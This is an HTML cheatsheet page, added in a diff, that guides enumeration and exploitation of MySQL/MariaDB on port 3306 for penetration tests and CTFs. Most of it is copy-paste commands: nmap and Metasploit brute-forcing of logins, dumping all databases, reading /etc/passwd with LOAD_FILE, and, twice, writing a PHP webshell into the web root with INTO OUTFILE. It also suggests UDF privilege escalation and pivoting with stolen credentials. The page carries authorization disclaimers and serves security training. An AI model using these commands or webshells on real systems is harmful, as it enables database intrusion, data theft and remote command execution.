@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>3306 — MySQL / MariaDB (Database)</title>
+  <style>
+    :root {
+      --neon: #00ff99;
+      --bg: #000;
+      --border: 1px solid var(--neon);
+      --font: 'Courier New', Courier, monospace;
+    }
+
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--neon);
+      font-family: var(--font);
+      text-shadow: 0 0 5px var(--neon);
+      line-height: 1.6;
+    }
+
+    header {
+      text-align: center;
+      padding: 2.25rem;
+      border-bottom: var(--border);
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 2.4rem;
+    }
+
+    main {
+      max-width: 900px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+
+    h2 {
+      border-bottom: var(--border);
+      padding-bottom: 0.4rem;
+    }
+
+    code, pre {
+      background: rgba(0,255,153,0.07);
+      padding: 0.3rem 0.5rem;
+      border-radius: 6px;
+      color: var(--neon);
+      display: block;
+      overflow-x: auto;
+    }
+
+    details {
+      margin-bottom: 1.25rem;
+      border: var(--border);
+      border-radius: 8px;
+      padding: 1rem;
+    }
+
+    summary {
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 1.1rem;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem;
+      border-top: var(--border);
+      margin-top: 2rem;
+      font-size: 0.9rem;
+    }
+
+    a { color: var(--neon); }
+    a:hover { text-shadow: 0 0 10px var(--neon); }
+
+    .nav-link {
+      color: var(--neon);
+      text-decoration: none;
+      font-weight: 700;
+      text-shadow: 0 0 6px var(--neon);
+    }
+    .nav-link:hover { text-shadow: 0 0 10px var(--neon); }
+
+    hr.soft {
+      border: 0;
+      height: 1px;
+      background: rgba(0,255,153,0.06);
+      margin: 1.5rem 0;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Port 3306 — MySQL / MariaDB (Database)</h1>
+    <p>A guide to enumeration and exploitation of MySQL and MariaDB in engagement/CTF contexts</p>
+    <nav>
+      <a class="nav-link" href="https://www.studioellipsis.org/Computing/Tools/Marauders_Map.html">&lt;--</a>
+    </nav>
+  </header>
+
+  <main>
+    <h2>0) What is MySQL / MariaDB?</h2>
+    <p>
+      MySQL and MariaDB are widely-used relational database servers that typically listen on TCP port 3306. They store application data, credentials, configuration, and sometimes secrets. In assessments and red-team competitions, an exposed database server (remote access to port 3306) is high-value: weak credentials, misconfigurations, or excessive privileges (e.g., FILE) let you dump data, read server files, or write web shells.
+    </p>
+
+    <details open>
+      <summary>1) Recon Phase</summary>
+      <pre>
+- Service discovery: nmap -sV -p 3306 &lt;target&gt;
+- Banner grab & version: nmap -sV -p 3306 --script=mysql-info &lt;target&gt;
+- Check reachability from your network (telnet &lt;target&gt; 3306 or nc -vz)
+- Identify hosts running MySQL vs MariaDB via banner and fingerprinting
+      </pre>
+      <p>
+        Note version strings (important for known CVEs) and whether the server accepts remote connections. Record any hostnames or service names returned in banners.
+      </p>
+    </details>
+
+    <details>
+      <summary>2) Enumeration Phase</summary>
+      <pre>
+- Attempt anonymous/null auth (rare): mysql -h &lt;target&gt; -u '' -e "SHOW DATABASES;"
+- Test common creds / defaults: mysql -h &lt;target&gt; -u root -p (try default/root passwords)
+- Use targeted scanners:
+    nmap --script=mysql-brute,mysql-info -p 3306 &lt;target&gt;
+    msfconsole: auxiliary/scanner/mysql/mysql_login
+- Enumerate users & privileges (when authenticated):
+    SELECT User, Host FROM mysql.user;
+    SHOW GRANTS FOR 'user'@'host';
+- Check for users with FILE privilege (allows server-side file read/write)
+    SELECT * FROM mysql.user WHERE File_priv='Y' OR Super_priv='Y';
+- Discover databases/tables when authenticated:
+    SHOW DATABASES;
+    USE <db>; SHOW TABLES;
+    SELECT COUNT(*) FROM <table> LIMIT 1;
+      </pre>
+      <p>
+        Prioritize finding credentials, users with elevated privileges, and evidence of stored secrets (config tables, api_keys, password reset tokens).
+      </p>
+    </details>
+
+    <details>
+      <summary>3) Exploitation Phase</summary>
+      <pre>
+- Dumping data (authenticated):
+    mysqldump -h &lt;target&gt; -u user -p'password' --all-databases > dump.sql
+
+- Read server files via SQL functions (if FILE privilege or insecure secure_file_priv):
+    SELECT LOAD_FILE('/etc/passwd');
+    SELECT @@global.secure_file_priv;
+
+- Write files (if FILE/write allowed) to webroot to get a webshell:
+    SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+- UDF / shared object based privilege escalation (advanced, only in CTF/lab):
+    # create shared object on server and register UDF to execute commands
+
+- Use credentials found to pivot: SSH, HTTP (admin panels), or other DB servers
+- If remote root access allowed, change passwords or create admin user (ONLY in authorized CTFs)
+- When service is reachable only from app server, use SQLi (sqlmap) or stolen DB creds to access remote DB
+      </pre>
+      <p>
+        Exploitation depends on privileges. FILE or OUTFILE capabilities let you interact with the filesystem; UDFs can give command execution. Always follow rules of engagement in competitions—UDFs and OUTFILE are destructive if misused.
+      </p>
+    </details>
+
+    <details>
+      <summary>MySQL / MariaDB Info — What to Look For</summary>
+      <ul>
+        <li>Default or weak credentials (root/root, root with no password)</li>
+        <li>Accounts with excessive privileges (FILE, SUPER, PROCESS)</li>
+        <li>Plaintext credentials stored in config tables or application DB</li>
+        <li>secure_file_priv unset or set to a writable directory</li>
+        <li>Remote access allowed from internet (bind-address 0.0.0.0)</li>
+        <li>Old versions with known exploits or misconfigurations</li>
+      </ul>
+    </details>
+
+    <h2>Tools Required</h2>
+    <pre>
+sudo apt install nmap mysql-client mariadb-client mysql-server
+# pentest tools
+sudo apt install hydra sqlmap metasploit-framework
+# utilities
+mysqldump mysqlshow mysqladmin
+    </pre>
+
+    <h2>Quick copy-paste command cheatsheet</h2>
+    <pre>
+# discovery & banner
+nmap -sV -p 3306 --script=mysql-info,mysql-config &lt;target&gt;
+
+# test connectivity
+nc -vz &lt;target&gt; 3306
+telnet &lt;target&gt; 3306
+
+# try login (interactive)
+mysql -h &lt;target&gt; -u root -p
+
+# automated brute (authorized only)
+nmap --script mysql-brute -p 3306 --script-args userdb=users.txt,passdb=pass.txt &lt;target&gt;
+msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS &lt;target&gt;; set USERNAME root; set PASSWORD 1234; run; exit"
+
+# once authenticated: list databases/tables
+SHOW DATABASES;
+USE <db>; SHOW TABLES;
+
+# dump databases (authenticated)
+mysqldump -h &lt;target&gt; -u user -p'password' --databases <db> &gt; db.sql
+
+# check FILE privileges / secure_file_priv
+SELECT User, Host, File_priv, Super_priv FROM mysql.user;
+SELECT @@global.secure_file_priv;
+
+# attempt to read file (if allowed)
+SELECT LOAD_FILE('/etc/passwd');
+
+# write webshell (if permitted by secure_file_priv and webroot path)
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+    </pre>
+
+    <h2>Citations</h2>
+    <ul>
+      <li><a href="https://dev.mysql.com/doc/refman/en/" target="_blank" rel="noopener">MySQL Reference Manual</a></li>
+      <li><a href="https://mariadb.com/kb/en/" target="_blank" rel="noopener">MariaDB Knowledge Base</a></li>
+      <li><a href="https://nmap.org/nsedoc/scripts/mysql-info.html" target="_blank" rel="noopener">Nmap NSE — mysql-info / mysql-brute</a></li>
+      <li><a href="https://sqlmap.org/" target="_blank" rel="noopener">sqlmap — automated SQL injection (useful when DB accessible via web app)</a></li>
+    </ul>
+
+    <hr class="soft" />
+    <p style="font-size:0.95rem;opacity:0.95;">
+      <strong>Disclaimer:</strong> Use these techniques only on systems you own, in contained labs, or where you have explicit authorization (CTF / engagement rules). Actions such as writing files, UDF upload, or changing database state can be disruptive—treat them as last-resort, score-hungry moves and follow the rules of engagement.
+    </p>
+  </main>
+
+  <footer>
+    &copy; 2025 Riley Owen — Studio Ellipsis Cybersecurity Writeups
+  </footer>
+</body>
+</html>
